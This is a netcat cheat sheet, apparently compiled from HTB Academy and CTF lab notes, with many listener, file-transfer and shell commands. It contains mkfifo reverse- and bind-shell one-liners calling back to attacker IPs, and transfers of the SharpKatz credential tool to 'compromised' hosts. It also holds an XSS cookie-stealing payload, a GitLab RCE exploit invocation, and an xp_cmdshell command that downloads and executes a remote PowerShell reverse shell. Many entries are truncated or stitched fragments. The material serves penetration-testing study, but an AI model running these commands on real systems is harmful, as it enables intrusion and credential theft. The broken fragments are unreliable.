# Netcat

% netcat, nc, relay, cpts

## Netcat - Netcat - Netcat - Netcat - Netcat - powershell-web-upload
#cat/PIVOT/TUNNEL-PORTFW #cpts
b64

```
nc -lvnp 8000
```

## Netcat - Netcat - Netcat - Netcat - Netcat - powershell-web-upload-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
b64

```
echo <file>_content | base64 -d -w 0 > hosts
```

## Netcat - Netcat - Netcat - Netcat - Netcat - netcat
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
nc -l -p <port> > <file>name
```

## Netcat - Netcat - Netcat - Netcat - Netcat - ncat
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
ncat -l -p <port> --recv-only > <file>name
```

## Netcat - Netcat - Netcat - Netcat - Netcat - netcat-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
nc -q 0 <ip> <port> < <file>name
```

## Netcat - Netcat - Netcat - Netcat - Netcat - ncat-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
ncat --send-only <ip> <port> < <file>name
```

## Netcat - Netcat - Netcat - Netcat - Netcat - a-faire-dpuis-notre-hôte
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
nc -lnvp <port>
```

## Netcat - Netcat - Netcat - Netcat - Netcat - server---binding-a-bash-shell-to-the-tcp-session
#cat/PIVOT/TUNNEL-PORTFW #cpts
Server

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $listeningIp $listeningPort > /tmp/f
```

## Netcat - Netcat - Netcat - Netcat - Netcat - server---binding-a-bash-shell-to-the-tcp-session-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
Attacker

```
nc -nv $serverIp $serverPort
```

## Netcat - Netcat - Netcat - Netcat - Netcat - server---binding-a-bash-shell-to-the-tcp-session-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp <port> >/tmp/f
```

## Netcat - Netcat - Netcat - Netcat - Netcat - pop3-commands
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
nc -nv <ip> 110
```

## Netcat - Netcat - Netcat - Netcat - Netcat - netcat---compromised-machine---listening-on-port-8000
#cat/PIVOT/TUNNEL-PORTFW #cpts
Miscellaneous File Transfer Methods

```
:~$ nc -l -p 8000 > SharpKatz.exe
```

## Netcat - Netcat - Netcat - Netcat - Netcat - ncat---compromised-machine---listening-on-port-8000
#cat/PIVOT/TUNNEL-PORTFW #cpts
Miscellaneous File Transfer Methods

```
:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

## Netcat - Netcat - Netcat - Netcat - Netcat - attack-host---sending-file-as-input-to-netcat
#cat/PIVOT/TUNNEL-PORTFW #cpts
Miscellaneous File Transfer Methods

```
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

## Netcat - Netcat - Netcat - Netcat - Netcat - compromised-machine-connect-to-netcat-to-receive-the-file
#cat/PIVOT/TUNNEL-PORTFW #cpts
Miscellaneous File Transfer Methods

```
:~$ # Example using Original Netcat
```

## Netcat - Netcat - Netcat - Netcat - Netcat - attack-host---sending-file-as-input-to-ncat
#cat/PIVOT/TUNNEL-PORTFW #cpts
Miscellaneous File Transfer Methods

```
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

## Netcat - Netcat - Netcat - Netcat - Netcat - compromised-machine-connect-to-ncat-to-receive-the-file
#cat/PIVOT/TUNNEL-PORTFW #cpts
Miscellaneous File Transfer Methods

```
:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

## Netcat - Netcat - Netcat - Netcat - Netcat - compromised-machine-connecting-to-netcat-using-devtcp-to-receive-the-f
#cat/PIVOT/TUNNEL-PORTFW #cpts
Miscellaneous File Transfer Methods

```
:~$ cat <dev_tcp_192_168_49_128_443> SharpKatz.exe
```

## Netcat - Netcat - Netcat - Netcat - Netcat - file-received-in-our-netcat-session
#cat/PIVOT/TUNNEL-PORTFW #cpts
Living off The Land

```
sudo nc -lvnp 8000
```

## Netcat - Netcat - Netcat - Netcat - Netcat - file-received-in-our-netcat-session-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
Living off The Land

```
for 16-bit app support
```

## Netcat - Netcat - Netcat - Netcat - Netcat - request-with-chrome-user-agent
#cat/PIVOT/TUNNEL-PORTFW #cpts
Evading Detection

```
nc -lvnp 80
```

## Netcat - Netcat - Netcat - Netcat - Netcat - request-with-chrome-user-agent-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
Evading Detection

```
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
```

## Netcat - Netcat - Netcat - Netcat - Netcat - what-is-the-value-of-the-flag-cookie
#cat/PIVOT/TUNNEL-PORTFW #cpts
After spawning the target machine, students need to visit it's`/assessment` page and notice that it says "comments must be approved by an admin": Therefore, students need to hijack the cookie of the admin. Scrolling down

```
nc -nvlp PWNPO
```

## Netcat - Netcat - Netcat - Netcat - Netcat - what-is-the-value-of-the-flag-cookie-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
Then, they need to use the payload `'><script src="http://PWNIP:PWNPO/FieldName"></script>` in the all of the fields to see which ones will request a file to the `nc` listener: However, the name and email fields are to b

```
shell-session
```

## Netcat - Netcat - Netcat - Netcat - Netcat - abusing-built-in-functionality
#cat/PIVOT/TUNNEL-PORTFW #cpts
The next step is to choose `Install app from file` and upload the application. https://10.129.201.50:8000/en-US/manager/search/apps/local Before uploading the malicious custom app, let's start a listener using Netcat or

```
sudo nc -lnvp 443
```

## Netcat - Netcat - Netcat - Netcat - Netcat - authenticated-remote-code-execution
#cat/PIVOT/TUNNEL-PORTFW #cpts
And we get a shell almost instantly.

```
nc -lnvp 8443
```

## Netcat - Netcat - Netcat - Netcat - Netcat - exploitation-to-reverse-shell-access
#cat/PIVOT/TUNNEL-PORTFW #cpts
From here, we could begin hunting for sensitive data or attempt to escalate privileges. During a network penetration test, we could try to use this host to pivot further into the internal network.

```
sudo nc -lvnp 7777
```

## Netcat - Netcat - Netcat - Netcat - Netcat - gain-remote-code-execution-on-the-gitlab-instance-submit-the-flag-in-t
#cat/PIVOT/TUNNEL-PORTFW #cpts
Then, on Pwnbox/`PMVPN`, students need to start an `nc` listener:

```
nc -nvlp 9001
```

## Netcat - Netcat - Netcat - Netcat - Netcat - gain-remote-code-execution-on-the-gitlab-instance-submit-the-flag-in-t-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
└──╼ [★]$ python3 49951.py -t http://gitlab.inlanefreight.local:8081 -u HTBAcademy -p password123 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.169 9001 >/tmp/f'
```

## Netcat - Netcat - Netcat - Netcat - Netcat - enumerate-the-host-exploit-the-shellshock-vulnerability-and-submit-the
#cat/PIVOT/TUNNEL-PORTFW #cpts
Subsequently, students need to start an `nc` listener to prepare for a reverse shell:

```
sudo nc -lvnp PWNPO
```

## Netcat - Netcat - Netcat - Netcat - Netcat - obtain-reverse-shell-access-on-the-target-and-submit-the-contents-of-t
#cat/PIVOT/TUNNEL-PORTFW #cpts
Subsequently, students need to start an `nc` listener in the same terminal tab and background it (attaining a job ):

```
nc -nvlp PWNPO &
```

## Netcat - Netcat - Netcat - Netcat - Netcat - obtain-reverse-shell-access-on-the-target-and-submit-the-contents-of-t-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
[9]+ Stopped nc -nvlp 9001
```

## Netcat - Netcat - Netcat - Netcat - Netcat - sudo-rights-abuse
#cat/PIVOT/TUNNEL-PORTFW #cpts
Let's try this out. First, make a file to execute with the `postrotate-command`, adding a simple reverse shell one-liner.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.3 443 >/tmp/f
```

## Netcat - Netcat - Netcat - Netcat - Netcat - sudo-rights-abuse-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
We receive a root shell almost instantly.

```
nc -lnvp 443
```

## Netcat - Netcat - Netcat - Netcat - Netcat - logrotate
#cat/PIVOT/TUNNEL-PORTFW #cpts
In our case, it is the option: `create`. Therefore we have to use the exploit adapted to this function. After that, we have to start a listener on our VM / Pwnbox, which waits for the target system's connection.

```
nc -nlvp 9001
```

## Netcat - Netcat - Netcat - Netcat - Netcat - connect-to-the-target-system-and-escalate-privileges-by-abusing-the-mi
#cat/PIVOT/TUNNEL-PORTFW #cpts
Students first need to start an `nc` listener on Pwnbox/`PMVPN`:

```
sudo nc -nvlp 443
```

## Netcat - Netcat - Netcat - Netcat - Netcat - catching-system-shell
#cat/PIVOT/TUNNEL-PORTFW #cpts
This completes successfully, and a shell as `NT AUTHORITY\SYSTEM` is received.

```
sudo nc -lnvp 8443
```

## Netcat - Netcat - Netcat - Netcat - Netcat - catching-system-shell-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
This completes successfully, and a shell as `NT AUTHORITY\SYSTEM` is received.

```
(c) 2016 Microsoft Corporation. All rights reserved.
```

## Netcat - Netcat - Netcat - Netcat - Netcat - another-method-is
#cat/PIVOT/TUNNEL-PORTFW #cpts
*Note: the files must be in the same local folder as the one you executed the evil-winrm command from.* Then, we are going to set up a listener on our local machine.

```
rlwrap nc -lvnp 9001
```

## Netcat - Netcat - Netcat - Netcat - Netcat - starting-nc-listener-on-attack-host
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
nc -lvnp 8443
```

## Netcat - Netcat - Netcat - Netcat - Netcat - catching-a-system-shell
#cat/PIVOT/TUNNEL-PORTFW #cpts
Finally, start a `Netcat` listener on the attack box and execute the PoC PowerShell script on the target host (after [modifying the PowerShell execution policy](https://www.netspi.com/blog/technical/network-penetration-t

```
nc -lvnp 9443
```

## Netcat - Netcat - Netcat - Netcat - Netcat - catching-shell
#cat/PIVOT/TUNNEL-PORTFW #cpts
If all goes to plan, we will receive a connection back as `NT AUTHORITY\SYSTEM`.

```
nc -lnvp 9443
```

## Netcat - Netcat - Netcat - Netcat - Netcat - exploit-the-wordpress-instance-and-find-a-flag-in-the-web-root-submit-
#cat/PIVOT/TUNNEL-PORTFW #cpts
After updating the file successfully, students need to start an `nc` listener on the same port that was specified in the PHP reverse shell (`443` in this case):

```
sudo nc -nvlp PWNPO
```

## Netcat - Netcat - Netcat - Netcat - Netcat - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the
#cat/PIVOT/TUNNEL-PORTFW #cpts
```
:~# nc -nvlp 9999
```

## Netcat - Netcat - Netcat - Netcat - Netcat - retrieve-the-contents-of-the-sam-database-on-the-dev01-host-submit-the-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
On the `nc` port 9999 listener, the callback will appear and the reverse shell connection will be established:

```
(c) 2018 Microsoft Corporation. All rights reserved.
```

## Netcat - Netcat - Netcat - Netcat - Netcat - deserialization
#cat/PIVOT/TUNNEL-PORTFW #cpts
ysoserial.net dotnet Ma machine

```
cat test.txt | iconv -t utf-16le | base64 -w 0
```

## Netcat - Netcat - Netcat - Netcat - Netcat - deserialization-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
ysoserial.net dotnet Ma machine

```
rlwrap nc -lnvp 4444
```

## Netcat - Netcat - Netcat - Netcat - Netcat - freelancer
#cat/PIVOT/TUNNEL-PORTFW #cpts
extrait du PDF Joplin: freelancer

```
reverse.ps1 iwr http://10.10.14.82:8000/nc64.exe -outfile c:\\users\\public\\nc64.exe; c:\\users\\public\\nc64.exe -e powershell.exe 10.10.14.82 10001 python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...10.129.20.59 - - [20/Sep/2024 13:51:42] "GET /reverse.ps1 HTTP/1.1" 200 - 10.129.20.59 - - [20/Sep/2024 13:51:42] "GET /nc64.exe HTTP/1.1" 200 - EXECUTE AS LOGIN = 'sa'; EXEC xp_cmdshell "powershell -ep bypass iex(iwr http://10.10.14.82:8000/reverse.ps1 -usebasicp)"; We begin enumeration of the target and check for low-hanging fruit. Since we got our reverse shel
```

## Netcat - Netcat - Netcat - Netcat - Netcat - freelancer-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
extrait du PDF Joplin: freelancer

```
nc -lvnp 10001 listening on [any] 10001... connect to [10.10.14.82] from (UNKNOWN) [10.129.20.59] 62355 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS
```

## Netcat - Netcat - Netcat - Netcat - Netcat - freelancer-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
extrait du PDF Joplin: freelancer

```
nc -lvnp 10001 listening on [any] 10001... connect to [10.10.14.82] from (UNKNOWN) [10.129.20.59] 57251 Microsoft Windows [Version 10.0.17763.5830] (c) 2018 Microsoft Corporation. All rights reserved. whoami freelancer\mikasaackerman PS dir Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/28/2023 6:23 PM 1468 mail.txt -a---- 10/4/2023 1:47 PM 292692678 MEMORY.7z -ar--- 9/20/2024 1:40 PM 34 user.txt PS gc mail.txt Hello Mikasa, I tried once again to work with Liza Kazanoff after seeking her help to troubleshoot the BSOD issue on the "DATACENTER-2019" computer. As you kno
```

## Netcat - Netcat - Netcat - Netcat - Netcat - pandora
#cat/PIVOT/TUNNEL-PORTFW #cpts
extrait du PDF Joplin: pandora

```
nc -nvlp 1234
```

## Netcat - Netcat - Netcat - Netcat - Netcat - pandora-2
#cat/PIVOT/TUNNEL-PORTFW #cpts
extrait du PDF Joplin: pandora

```
strings pandora_backup We will also need to give it the executable permissions. After the tar file has been created, we have to modify the current user's PATH variable on the remote system and prepend the /tmp folder so that it is the first folder that bash searches for binaries in. Entries in the PATH variable are separated by a colon : . Note : The above command sets the value of PATH to /tmp plus the previous value of PATH. Start a Netcat listener on your local machine Then, run the pandora_backup binary so as to trigger the reverse shell through the malicious tar file. #!/bin/bash bash -i
```

## Netcat - Netcat - Netcat - Netcat - Netcat - pandora-3
#cat/PIVOT/TUNNEL-PORTFW #cpts
extrait du PDF Joplin: pandora

```
nc -nvlp 4444
```

